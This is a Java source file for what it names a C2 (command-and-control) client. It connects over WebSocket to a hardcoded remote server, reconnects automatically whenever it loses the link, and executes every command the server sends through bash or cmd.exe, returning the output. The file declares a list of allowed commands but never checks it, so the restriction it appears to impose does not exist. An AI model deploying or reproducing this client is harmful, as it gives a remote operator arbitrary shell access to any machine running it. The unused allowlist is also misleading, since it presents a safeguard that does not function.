package com.c2.client;

import com.c2.protocol.ProtocolMessage;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;

import java.net.URI;
import java.util.Arrays;
import java.util.List;

public class Client {

    private static final String DEFAULT_SERVER_URI = "wss://distributed-command-system-production.up.railway.app/ws";
    private static final String SERVER_URI = System.getenv("SERVER_URL") != null
            ? System.getenv("SERVER_URL")
            : DEFAULT_SERVER_URI;
    private static final long RECONNECT_DELAY_MS = 3000;

    private static final List<String> ALLOWED_COMMANDS = Arrays.asList(
            "PING", "INFO", "TIME", "HELP", "WHOAMI", "HOSTNAME", "PWD", "DATE", "LS", "DIR"
    );

    public static void main(String[] args) {
        while (true) {
            try {
                connectAndListen();
            } catch (Exception e) {
                System.out.println("Disconnected from server, retrying in 3 seconds...");
                sleepBeforeReconnect();
            }
        }
    }

    private static void connectAndListen() throws Exception {

        WebSocketClient client = new WebSocketClient(new URI(SERVER_URI)) {

            @Override
            public void onOpen(ServerHandshake handshake) {
                System.out.println("[+] Connected to server");
            }

            @Override
            public void onMessage(String message) {
                handleMessage(message, this);
            }

            @Override
            public void onClose(int code, String reason, boolean remote) {
                System.out.println("Connection closed: " + reason);
            }

            @Override
            public void onError(Exception ex) {
                System.out.println("Error: " + ex.getMessage());
            }
        };

        client.connectBlocking(); // wait for connection

        // keep alive loop
        while (client.isOpen()) {
            Thread.sleep(1000);
        }
    }

    private static void handleMessage(String rawJson, WebSocketClient client) {
        ProtocolMessage message;

        try {
            message = ProtocolMessage.fromJson(rawJson);
        } catch (JSONException e) {
            System.out.println("Invalid JSON from server: " + rawJson);
            return;
        }

        // 🔥 HEARTBEAT
        if (ProtocolMessage.TYPE_HEARTBEAT.equals(message.type())) {
            client.send(ProtocolMessage
                    .success(message.id(), message.target(), "ALIVE")
                    .toJson());
            return;
        }

        // 🔥 VALIDATE TYPE
        if (!ProtocolMessage.TYPE_COMMAND.equals(message.type())) {
            client.send(ProtocolMessage
                    .error(message.id(), message.target(), "Unsupported message type")
                    .toJson());
            return;
        }

        // 🔥 HANDLE COMMAND
        try {
            String result = handleCommand(message.command());

            client.send(ProtocolMessage
                    .success(message.id(), message.target(), result)
                    .toJson());

        } catch (IllegalArgumentException e) {
            client.send(ProtocolMessage
                    .error(message.id(), message.target(), e.getMessage())
                    .toJson());

        } catch (Exception e) {
            client.send(ProtocolMessage
                    .error(message.id(), message.target(), "Command failed: " + e.getMessage())
                    .toJson());
        }
    }

    private static void sleepBeforeReconnect() {
        try {
            Thread.sleep(RECONNECT_DELAY_MS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static String handleCommand(String command) throws Exception {
        String normalized = command == null ? "" : command.trim();
        if (normalized.isEmpty()) {
            return "Empty command";
        }

        return executeArbitrary(normalized);
    }

    private static String executeArbitrary(String command) {
        try {
            ProcessBuilder pb;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                pb = new ProcessBuilder("cmd.exe", "/c", command);
            } else {
                pb = new ProcessBuilder("bash", "-c", command);
            }
            pb.redirectErrorStream(true);
            Process process = pb.start();

            try (java.util.Scanner s = new java.util.Scanner(process.getInputStream()).useDelimiter("\\A")) {
                String result = s.hasNext() ? s.next() : "";

                if (process.waitFor(10, java.util.concurrent.TimeUnit.SECONDS)) {
                    return result.isBlank() ? "Command executed (no output)" : result.trim();
                } else {
                    process.destroyForcibly();
                    return result + "\n[Error: Command timed out after 10s]";
                }
            }
        } catch (Exception e) {
            return "Execution failed: " + e.getMessage();
        }
    }
}